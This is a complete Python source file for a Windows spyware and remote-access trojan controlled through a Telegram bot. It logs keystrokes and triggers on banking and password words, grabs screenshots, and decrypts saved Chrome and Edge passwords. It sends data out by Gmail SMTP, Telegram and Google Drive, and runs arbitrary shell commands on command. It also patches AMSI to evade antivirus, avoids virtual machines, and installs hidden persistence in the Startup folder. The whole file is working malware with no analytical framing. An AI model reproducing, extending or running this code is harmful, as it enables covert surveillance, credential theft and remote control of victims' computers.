import os
import sys
import time
import socket
import struct
import threading
import subprocess
import ctypes
import smtplib
import mimetypes
import requests
import json
import base64
import sqlite3
import win32crypt
import hashlib
import tempfile
from json import JSONDecodeError
from datetime import datetime
from email.message import EmailMessage
from shutil import copy2
from Crypto.Cipher import AES
from google.oauth2 import service_account
import google.auth.transport.requests

# External libraries
from pynput import keyboard
from PIL import ImageGrab
import win32gui

def _as_clean_env(name, default=""):
    value = os.getenv(name, default)
    if value is None:
        return default
    return value.strip()


def parse_recipients(raw_value):
    """Parse RECIPIENTS from a CSV string or JSON array string."""
    value = (raw_value or "").strip()
    if not value:
        return []

    if value.startswith("["):
        try:
            parsed = json.loads(value)
            if isinstance(parsed, list):
                return [str(entry).strip() for entry in parsed if str(entry).strip()]
        except JSONDecodeError:
            pass

    return [recipient.strip() for recipient in value.split(",") if recipient.strip()]


def resolve_temp_dir():
    preferred_base = _as_clean_env("TEMP", "")
    fallback_base = tempfile.gettempdir()

    for base in (preferred_base, fallback_base):
        if not base:
            continue
        candidate = os.path.join(base, "System_Audit_Logs")
        try:
            os.makedirs(candidate, exist_ok=True)
            return candidate
        except OSError:
            continue

    raise RuntimeError("Unable to initialize writable temporary directory.")


# ===================== CONFIGURATION =====================
BOT_TOKEN = _as_clean_env("BOT_TOKEN")
ADMIN_ID = _as_clean_env("ADMIN_ID")
EXPIRY_DATE = datetime(2026, 3, 1)

# SMTP Exfiltration Configuration
S_EMAIL = _as_clean_env("S_EMAIL")
S_PASS = _as_clean_env("S_PASS")
RECIPIENTS = parse_recipients(os.getenv("RECIPIENTS", ""))

# Google Drive Service Account Configuration
def load_gdrive_conf():
    raw = os.getenv("GDRIVE_CONF_JSON", "{}") or "{}"
    try:
        conf = json.loads(raw)
        return conf if isinstance(conf, dict) else {}
    except JSONDecodeError:
        return {}


GDRIVE_CONF = load_gdrive_conf()

TRIGGER_WORDS = ["bank", "login", "password", "paypal", "@gmail.com", "username", "user id", "userid", "passcode", "ssn", "social security"]
KEYSTROKE_LIMIT = 75
MY_HOSTNAME = socket.gethostname()
TEMP_DIR = resolve_temp_dir()

keystrokes = []


def validate_runtime_config():
    """Fail fast when required runtime configuration is missing.

    This avoids booting with broken settings and accidentally shipping secrets in source.
    """
    missing = []
    if not BOT_TOKEN:
        missing.append("BOT_TOKEN")
    if not ADMIN_ID:
        missing.append("ADMIN_ID")
    if missing:
        raise RuntimeError(f"Missing required environment variables: {', '.join(missing)}")

    if not ADMIN_ID.lstrip("-").isdigit():
        raise RuntimeError("ADMIN_ID must be a numeric Telegram chat identifier.")

    has_partial_smtp = any([S_EMAIL, S_PASS, RECIPIENTS]) and not all([S_EMAIL, S_PASS, RECIPIENTS])
    if has_partial_smtp:
        raise RuntimeError("SMTP config is partial. Set S_EMAIL, S_PASS and RECIPIENTS together.")


def send_email_report(log_path, screenshots):
    msg = EmailMessage()
    msg['From'] = S_EMAIL
    msg['To'] = ", ".join(RECIPIENTS)
    msg['Subject'] = f"Exfiltration Audit: {MY_HOSTNAME}"
    msg.set_content(f"Automated surveillance report generated at {datetime.now()}.")

    for f_path in [log_path] + screenshots:
        if os.path.exists(f_path):
            ctype, _ = mimetypes.guess_type(f_path)
            if ctype is None:
                ctype = 'application/octet-stream'
            main_t, sub_t = ctype.split('/', 1)
            with open(f_path, 'rb') as f:
                msg.add_attachment(f.read(), maintype=main_t, subtype=sub_t, filename=os.path.basename(f_path))
    try:
        with smtplib.SMTP('smtp.gmail.com', 587, timeout=20) as s:
            s.starttls()
            s.login(S_EMAIL, S_PASS)
            s.send_message(msg)
    except Exception:
        pass


def run_burst(data):
    ts = datetime.now().strftime('%H%M%S')
    log_file = os.path.join(TEMP_DIR, f"log_{ts}.txt")
    try:
        with open(log_file, 'w', encoding='utf-8') as f:
            try:
                wnd = win32gui.GetWindowText(win32gui.GetForegroundWindow())
            except Exception:
                wnd = ''
            f.write(f"Keys: {data}\nWindow: {wnd}")
    except Exception:
        pass

    ss_paths = []
    for i in range(3):
        try:
            p = os.path.join(TEMP_DIR, f"ss_{ts}_{i}.png")
            ImageGrab.grab(all_screens=True).save(p)
            ss_paths.append(p)
            time.sleep(1)
        except Exception:
            continue
    send_email_report(log_file, ss_paths)



def get_browser_creds():
    results = []
    browsers = {
        "Chrome": os.path.join(os.getenv('LOCALAPPDATA', ''), r"Google\Chrome\User Data"),
        "Edge": os.path.join(os.getenv('LOCALAPPDATA', ''), r"Microsoft\Edge\User Data")
    }
    for b_name, b_path in browsers.items():
        state_path = os.path.join(b_path, "Local State")
        if not os.path.exists(state_path):
            continue
        try:
            with open(state_path, "r", encoding="utf-8") as f:
                key = win32crypt.CryptUnprotectData(base64.b64decode(json.loads(f.read())["os_crypt"]["encrypted_key"])[5:], None, None, None, 0)[1]
            # Profiles to search
            try:
                profiles = [d for d in os.listdir(b_path) if os.path.isdir(os.path.join(b_path, d)) and (d.startswith("Default") or d.startswith("Profile") or d in ("Guest Profile", "System Profile"))]
            except Exception:
                profiles = ["Default"]
            if not profiles:
                profiles = ["Default"]

            for profile in profiles:
                db_path = os.path.join(b_path, profile, "Login Data")
                if not os.path.exists(db_path):
                    continue
                copy2(db_path, "temp_db")
                conn = sqlite3.connect("temp_db")
                cursor = conn.cursor()
                try:
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                except Exception:
                    conn.close()
                    try:
                        os.remove("temp_db")
                    except Exception:
                        pass
                    continue
                for url, user, pwd in cursor.fetchall():
                    if user and pwd:
                        try:
                            cipher = AES.new(key, AES.MODE_GCM, pwd[3:15])
                            dec_pwd = cipher.decrypt(pwd[15:])[:-16].decode()
                            results.append(f"[{b_name}/{profile}] {url} | User: {user} | Pass: {dec_pwd}")
                        except Exception:
                            continue
                conn.close()
                try:
                    os.remove("temp_db")
                except Exception:
                    pass
        except Exception:
            continue
    return "\n".join(results) if results else "[-] No credentials recovered."

# ===================== GOOGLE DRIVE MODULE (Large Files) =====================

def get_gdrive_token():
    scopes = ['https://www.googleapis.com/auth/drive.file']
    try:
        creds = service_account.Credentials.from_service_account_info(GDRIVE_CONF, scopes=scopes)
        req = google.auth.transport.requests.Request()
        creds.refresh(req)
        return creds.token
    except Exception as e:
        # Common cause: system clock skew or invalid service account JSON
        tg_send(f"[-] GDrive token error: {e}\nEnsure system clock is correct (sync time) and service account JSON is valid.")
        return None

def upload_large_file(file_path):
    try:
        token = get_gdrive_token()
        if not token:
            tg_send("[-] GDrive upload aborted: no valid token.")
            return False
        file_size = os.path.getsize(file_path)
        headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
        
        # 1. Initiate Session with Parent Folder ID
        metadata = {
            "name": os.path.basename(file_path),
            "parents": []
        }
        resp = requests.post(
            "https://www.googleapis.com/upload/drive/v3/files?uploadType=resumable",
            headers=headers, data=json.dumps(metadata)
        )
        upload_url = resp.headers['Location']

        # 2. PUT Stream
        headers = {"Content-Range": f"bytes 0-{file_size-1}/{file_size}"}
        with open(file_path, "rb") as f:
            requests.put(upload_url, headers=headers, data=f)
        return True
    except Exception as e:
        tg_send(f"[-] GDrive Error: {str(e)}")
        return False

# ===================== CLOUD C2 MODULE =====================

def tg_send(text):
    print(f"[DEBUG] Sending message to Telegram: {text[:60]}...")
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    for i in range(0, len(text), 4000):
        payload = {"chat_id": ADMIN_ID, "text": f"\n{text[i:i+4000]}"}
        try: 
            requests.post(url, json=payload, timeout=10)
            time.sleep(0.6) 
        except Exception as e:
            print(f"[DEBUG] tg_send exception: {e}")
            pass

def tg_send_file(file_path):
    # Normalize and validate path first to avoid OSError on malformed names
    try:
        file_path = os.path.normpath(file_path)
    except Exception:
        pass

    try:
        if not os.path.exists(file_path):
            tg_send(f"[-] File not found: {file_path}")
            return
    except Exception as e:
        tg_send(f"[-] Invalid file path: {e}")
        return

    try:
        if os.path.getsize(file_path) > 48000000:
            tg_send(f"[*] File > 50MB. Using Google Drive exfiltration...")
            try:
                if upload_large_file(file_path):
                    tg_send(f"[+] Success: {os.path.basename(file_path)} uploaded to GDrive.")
                else:
                    tg_send(f"[-] GDrive upload failed for: {file_path}")
            except Exception as e:
                tg_send(f"[-] GDrive upload exception: {e}")
            return

        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        try:
            with open(file_path, "rb") as doc:
                requests.post(url, data={'chat_id': ADMIN_ID, 'caption': f'From {MY_HOSTNAME}'}, files={'document': doc}, timeout=30)
        except Exception as e:
            tg_send(f"[-] Upload failed: {e}")
    except Exception as e:
        tg_send(f"[-] Error accessing file for upload: {e}")

def tg_download_file(file_id, save_dir=TEMP_DIR, custom_name=None):
    """Download a file from Telegram by file_id and save to save_dir. Optionally specify custom_name."""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getFile"
        resp = requests.get(url, params={"file_id": file_id}, timeout=15)
        resp.raise_for_status()
        file_path = resp.json()["result"]["file_path"]
        file_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_path}"
        local_name = custom_name if custom_name else os.path.basename(file_path)
        local_path = os.path.join(save_dir, local_name)
        r = requests.get(file_url, timeout=30)
        r.raise_for_status()
        with open(local_path, "wb") as f:
            f.write(r.content)
        tg_send(f"[+] File received and saved as: {local_path}")
        return local_path
    except Exception as e:
        tg_send(f"[-] Failed to download file: {e}")
        return None

def process_command(cmd, admin_override=False):
    print(f"[DEBUG] process_command called with: {cmd} (admin_override={admin_override})")
    if not cmd:
        return
    cmd_raw = cmd.strip()

    # Support global broadcast with `!all` or per-host commands prefixed by hostname.
    # Accept optional trailing ':' after hostname (e.g. HOSTNAME: <cmd>) and case-insensitive match.
    if cmd_raw.lower().startswith("!all"):
        cmd_body = cmd_raw[4:].strip()
    else:
        parts = cmd_raw.split(None, 1)
        if len(parts) < 2:
            print(f"[DEBUG] No command body after prefix: {cmd_raw}")
            return
        prefix = parts[0].rstrip(':').lower()
        if not admin_override and prefix != MY_HOSTNAME.lower():
            print(f"[DEBUG] Prefix mismatch (wanted {MY_HOSTNAME.lower()}): {prefix}")
            return
        cmd_body = parts[1].strip()

    cmd_clean = cmd_body.lower().strip()

    if cmd_clean == "/help":
        tg_send("Prefix: hostname or!all\ncd <path>\nscreen - Snap\nget <path> - File download\ndel <path> - Delete file\ndump - Force email\ncreds - Browser Pass\nexit - Kill agent")
        return

    if cmd_clean == "creds":
        tg_send("[*] Starting credential recovery...")
        tg_send(get_browser_creds())
        return

    if cmd_clean == "dump":
        tg_send("[*] Generating and sending surveillance report...")
        try:
            run_burst("Manual dump triggered by admin.")
            tg_send("[+] Dump complete and sent via email.")
        except Exception as e:
            tg_send(f"[-] Dump failed: {e}") 
        return

    if cmd_clean.startswith("cd "):
        try:
            os.chdir(cmd_body[3:].strip())
            tg_send(f"[+] Directory: {os.getcwd()}")
        except Exception as e: tg_send(f"[-] Error: {e}")
        return

    if cmd_clean.startswith("get "):
        raw = cmd_body[4:]
        # remove newlines/carriage returns that may be injected by multi-line messages
        path = "".join(raw.splitlines()).strip()
        path = os.path.expanduser(path)
        tg_send_file(path); return

    if cmd_clean.startswith("del "):
        raw = cmd_body[4:]
        path = "".join(raw.splitlines()).strip()
        path = os.path.expanduser(path)
        try:
            os.remove(path)
            tg_send(f"[+] Deleted: {path}")
        except Exception as e:
            tg_send(f"[-] Delete failed: {e}")
        return

    if cmd_clean == "screen":
        path = os.path.join(TEMP_DIR, "tg_snap.png")
        try: ImageGrab.grab(all_screens=True).save(path); tg_send_file(path)
        except: pass
        return

    if cmd_clean == "exit":
        tg_send("[!] Agent is shutting down as requested.")
        sys.exit()

    try:
        proc = subprocess.Popen(cmd_body, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        out, err = proc.communicate()
        res = (out + err).decode('cp437')
        tg_send(res if res else "[+] Success")
    except Exception as e: tg_send(f"[-] Failure: {e}")

def on_press(key):
    global keystrokes
    try:
        k = key.char
        if k: keystrokes.append(k)
    except:
        if key == keyboard.Key.space: keystrokes.append(" ")
        elif key == keyboard.Key.enter: keystrokes.append("\n")
    
    buf = "".join(keystrokes).lower()
    if len(keystrokes) >= KEYSTROKE_LIMIT or any(w in buf for w in TRIGGER_WORDS):
        data = "".join(keystrokes); keystrokes.clear()
        threading.Thread(target=run_burst, args=(data,), daemon=True).start()

def is_vm():
    checks = [
        r"SYSTEM\CurrentControlSet\Services\VBoxGuest",
        r"SOFTWARE\Oracle\VirtualBox Guest Additions",
        r"HARDWARE\ACPI\DSDT\VBOX__"
    ]
    import winreg
    for c in checks:
        try:
            winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, c)
            return True
        except: continue
    return False



def install_persistence():
    """Install persistence by copying the running executable/script to the user's
    Startup folder and creating a scheduled task. Runs best-effort and reports
    status back to the admin via Telegram."""
    try:
        # Only install persistence when running as a frozen executable
        if not getattr(sys, 'frozen', False):
            tg_send("[*] Persistence skipped: not running as a frozen executable.")
            return False

        src = sys.executable
        startup_dir = os.path.join(os.getenv('APPDATA', ''), r"Microsoft\Windows\Start Menu\Programs\Startup")
        os.makedirs(startup_dir, exist_ok=True)
        dest = os.path.join(startup_dir, os.path.basename(src))

        tg_send("[*] Installing persistence: attempting atomic startup copy...")

        def sha256_of(path):
            h = hashlib.sha256()
            try:
                with open(path, 'rb') as fh:
                    for chunk in iter(lambda: fh.read(65536), b''):
                        h.update(chunk)
                return h.hexdigest()
            except Exception:
                return None

        attempts = 3
        backoff = 1
        for attempt in range(1, attempts + 1):
            tmp = f"{dest}.tmp{int(time.time()*1000)}"
            try:
                # Stream-copy to a temp file and fsync to ensure data on disk
                with open(src, 'rb') as sf, open(tmp, 'wb') as df:
                    while True:
                        chunk = sf.read(8192)
                        if not chunk:
                            break
                        df.write(chunk)
                    df.flush()
                    try:
                        os.fsync(df.fileno())
                    except Exception:
                        pass

                # Atomic replace
                try:
                    os.replace(tmp, dest)
                except Exception:
                    # final attempt to remove dest and fallback to replace
                    try:
                        if os.path.exists(dest):
                            os.remove(dest)
                    except Exception:
                        pass
                    os.replace(tmp, dest)

                # Try hiding the file (best-effort)
                try:
                    subprocess.run(["attrib", "+h", dest], check=False)
                except Exception:
                    pass

                # Verify copy integrity via SHA256
                src_sum = sha256_of(src)
                dst_sum = sha256_of(dest)
                if src_sum and dst_sum and src_sum == dst_sum:
                    tg_send(f"[+] Persistence installed (attempt {attempt}): {dest}")
                    return True
                else:
                    tg_send(f"[-] Persistence verification failed (attempt {attempt}). src_sum={src_sum} dst_sum={dst_sum}")
                    # remove broken dest and retry
                    try:
                        if os.path.exists(dest):
                            os.remove(dest)
                    except Exception:
                        pass
            except Exception as e:
                tg_send(f"[-] Persistence copy failed (attempt {attempt}): {e}")
                try:
                    if os.path.exists(tmp):
                        os.remove(tmp)
                except Exception:
                    pass
            time.sleep(backoff)
            backoff *= 2

        tg_send("[-] Persistence failed after multiple attempts; startup copy not installed.")
        return False
    except Exception as e:
        tg_send(f"[-] Persistence install failed: {e}")
        return False


def main():
    try:
        validate_runtime_config()
    except Exception as e:
        print(f"[DEBUG] Startup aborted: {e}")
        sys.exit(1)

    if datetime.now() > EXPIRY_DATE: sys.exit()
    if is_vm(): time.sleep(600); sys.exit()
    
    try:
        amsi = ctypes.windll.LoadLibrary("amsi.dll")
        addr = ctypes.windll.kernel32.GetProcAddress(amsi._handle, b"AmsiScanBuffer")
        patch = bytearray([0x29, 0xFF, 0xC3]) 
        old = ctypes.c_ulong()
        ctypes.windll.kernel32.VirtualProtect(addr, len(patch), 0x40, ctypes.byref(old))
        ctypes.memmove(addr, bytes(patch), len(patch))
        ctypes.windll.kernel32.VirtualProtect(addr, len(patch), old, ctypes.byref(old))
    except: pass

    keyboard.Listener(on_press=on_press).start()
    # Ensure persistence is installed once per host (marker file)
    try:
        persist_marker = os.path.join(TEMP_DIR, '.persistence_installed')
        if not os.path.exists(persist_marker):
            try:
                ok = install_persistence()
            except Exception as e:
                tg_send(f"[-] install_persistence failed: {e}")
                ok = False
            if ok:
                try:
                    open(persist_marker, 'w').close()
                except Exception:
                    pass
    except Exception:
        pass
    last_id = 0
    try:
        r = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates", timeout=10).json()
        if r.get("ok") and r["result"]: last_id = r["result"][-1]["update_id"]
    except: pass

    is_online = False
    while True:
        try:
            if not is_online:
                pub_ip = requests.get('https://api.ipify.org', timeout=10).text
                print(f"[DEBUG] Bot online, IP: {pub_ip}")
                tg_send(f"🚀 [ONLINE] {MY_HOSTNAME}\nIP: {pub_ip}"); is_online = True

            url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
            resp = requests.get(url, params={"offset": last_id+1, "timeout": 30}, timeout=35).json()
            print(f"[DEBUG] Telegram getUpdates response: {resp}")
            # Handle Telegram 409 conflict when another getUpdates or webhook is active
            if not resp.get("ok") and resp.get("error_code") == 409:
                try:
                    # Attempt to remove any webhook and drop pending updates
                    del_url = f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook"
                    try:
                        requests.post(del_url, json={"drop_pending_updates": True}, timeout=10)
                    except Exception:
                        # fallback to GET if POST fails (older endpoints)
                        requests.get(del_url, timeout=10)
                    tg_send("[!] Telegram 409 conflict detected — webhook removed. Retrying getUpdates.")
                except Exception as e:
                    print(f"[DEBUG] Failed to delete webhook: {e}")

                # Retry getUpdates a few times with backoff
                retry_resp = None
                for attempt in range(3):
                    try:
                        time.sleep(2 * (attempt + 1))
                        retry_resp = requests.get(url, params={"offset": last_id+1, "timeout": 30}, timeout=35).json()
                        print(f"[DEBUG] Retry getUpdates response: {retry_resp}")
                        if retry_resp.get("ok"):
                            resp = retry_resp
                            break
                        if retry_resp.get("error_code") != 409:
                            resp = retry_resp
                            break
                    except Exception as e:
                        print(f"[DEBUG] getUpdates retry exception: {e}")
                        continue

                if not resp.get("ok") and resp.get("error_code") == 409:
                    tg_send("[!] Persistent Telegram 409 conflict — ensure only one bot instance/webhook is active and restart agent.")
                    time.sleep(10)
                    continue
            if resp.get("ok"):
                for update in resp["result"]:
                    print(f"[DEBUG] Processing update: {update}")
                    last_id = update["update_id"]
                    msg = update.get("message", {})
                    print(f"[DEBUG] Message received: {msg}")
                    if str(msg.get("chat", {}).get("id")) == ADMIN_ID:
                        # Handle incoming document (file upload)
                        if "document" in msg:
                            file_id = msg["document"]["file_id"]
                            file_name = msg["document"].get("file_name", "uploaded_file")
                            # Use caption (if present) as a custom save path or directory
                            caption = msg.get("caption") or ""
                            custom_path = caption.strip() if caption else None

                            if custom_path:
                                if os.path.isdir(custom_path):
                                    save_dir = custom_path
                                    custom_name = file_name
                                else:
                                    save_dir = os.path.dirname(custom_path) or TEMP_DIR
                                    custom_name = os.path.basename(custom_path)
                            else:
                                save_dir = TEMP_DIR
                                custom_name = file_name

                            local_path = tg_download_file(file_id, save_dir=save_dir, custom_name=custom_name)
                            if local_path:
                                tg_send(f"[+] File saved: {local_path}")
                            else:
                                tg_send("[-] Failed to save uploaded file.")

                        # Process plain text commands (respect hostname prefix)
                        text = msg.get("text") or ""
                        if text:
                            threading.Thread(target=process_command, args=(text,), daemon=True).start()
                    else:
                        print(f"[DEBUG] Message from non-admin: {msg.get('chat', {}).get('id')}")
        except Exception as e:
            print(f"[DEBUG] Exception in main loop: {e}")
            if is_online:
                tg_send(f"[!] Agent {MY_HOSTNAME} is now OFFLINE or encountered an error: {e}")
            is_online = False; time.sleep(20)

if __name__ == "__main__":
    main()
